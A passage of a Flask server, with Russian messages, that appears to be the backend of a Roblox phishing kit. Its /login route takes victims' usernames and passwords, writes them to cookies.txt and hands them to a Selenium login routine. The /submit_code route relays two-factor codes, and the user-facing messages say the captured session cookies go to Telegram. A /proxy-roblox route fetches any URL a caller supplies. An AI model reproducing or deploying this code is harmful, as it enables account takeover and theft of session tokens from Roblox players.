            <p>Файл login.html не найден. Ошибка: {e}</p>
            <p>Доступные файлы в static: {os.listdir('static')}</p>
        </body>
        </html>
        """

@app.route('/login.html')
def old_login_page():
    return render_template('login.html')

@app.route('/final.html')
def final_page():
    try:
        return app.send_static_file('final.html')
    except Exception as e:
        return f"""
        <!DOCTYPE html>
        <html>
        <head><title>Final Page</title></head>
        <body>
            <h1>Final Page</h1>
            <p>Файл final.html не найден. Ошибка: {e}</p>
            <p>Доступные файлы в static: {os.listdir('static')}</p>
        </body>
        </html>
        """

@app.route('/login', methods=['POST', 'OPTIONS'])
def login():
    if request.method == 'OPTIONS':
        # Preflight request
        return jsonify({})
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'message': 'Данные не получены'})
            
        username = data.get('username')
        password = data.get('password')
        remember = data.get('remember')
        
        if not username or not password:
            return jsonify({'success': False, 'message': 'Не указаны имя пользователя или пароль'})
            
        session_id = str(uuid.uuid4())

        cookies = {
            '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
            'username': username,
            'login_time': datetime.now().isoformat(),
            'session_id': f'roblox_session_{hash(username)}',
            'auth_token': f'auth_{hash(password)}',
            'remember_me': str(remember).lower()
        }
        with open('cookies.txt', 'w', encoding='utf-8') as f:
            json.dump(cookies, f, indent=2, ensure_ascii=False)

        result = roblox_login_and_get_cookies(username, password, session_id=session_id)
        if result.get('need_code'):
            return jsonify({'need_code': True, 'session_id': session_id})
        elif result.get('success'):
            return jsonify({'success': True, 'message': 'Вход выполнен успешно! Проверьте Telegram для получения куки.', 'cookies': result.get('cookies')})
        else:
            return jsonify({'success': False, 'message': result.get('message')})
    except Exception as e:
        print(f"Ошибка в login: {e}")
        return jsonify({'success': False, 'message': f'Внутренняя ошибка сервера: {str(e)}'})

@app.route('/submit_code', methods=['POST', 'OPTIONS'])
def submit_code():
    if request.method == 'OPTIONS':
        # Preflight request
        return jsonify({})
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'message': 'Данные не получены'})
            
        session_id = data.get('session_id')
        code = data.get('code')
        
        if not session_id or not code:
            return jsonify({'success': False, 'message': 'Не передан session_id или code'})
            
        username = selenium_sessions.get(session_id, {}).get('username', 'unknown')
        result = roblox_login_and_get_cookies(username, None, session_id=session_id, code=code)
        
        if result.get('success'):
            return jsonify({'success': True, 'message': 'Вход завершён! Проверьте Telegram для куки.', 'cookies': result.get('cookies')})
        else:
            return jsonify({'success': False, 'message': result.get('message')})
    except Exception as e:
        print(f"Ошибка в submit_code: {e}")
        return jsonify({'success': False, 'message': f'Внутренняя ошибка сервера: {str(e)}'})

@app.route('/health', methods=['GET'])
def health_check():
    """Проверка состояния сервера"""
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.now().isoformat(),
        'message': 'Сервер работает',
        'environment': os.environ.get('RENDER_ENVIRONMENT', 'development'),
        'port': os.environ.get('PORT', '5000'),
        'cors_enabled': True,
        'allowed_origins': ALLOWED_ORIGINS
    })

@app.route('/test')
def test_page():
    """Страница для тестирования API"""
    return render_template('test.html')

@app.route('/test-render')
def test_render_page():
    """Страница для тестирования CORS на Render"""
    return app.send_static_file('test_render_cors.html')

@app.route('/cloud-test')
def cloud_test_page():
    """Страница для тестирования облачного хостинга без Selenium"""
    return render_template('cloud-test.html')

@app.route('/proxy-roblox', methods=['POST'])
def proxy_roblox():
    """Прокси для обращения к Roblox API"""
    try:
        data = request.get_json()
        if not data or 'url' not in data:
            return jsonify({'error': 'URL не указан'})
        
        url = data['url']
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        return jsonify({
            'status': response.status_code,
            'headers': dict(response.headers),
            'data': response.text[:1000] if response.text else None
        })
    except Exception as e:
        return jsonify({'error': f'Ошибка прокси: {str(e)}'})

if __name__ == '__main__':
    # Для локальной разработки
    app.run(debug=True, port=5000) 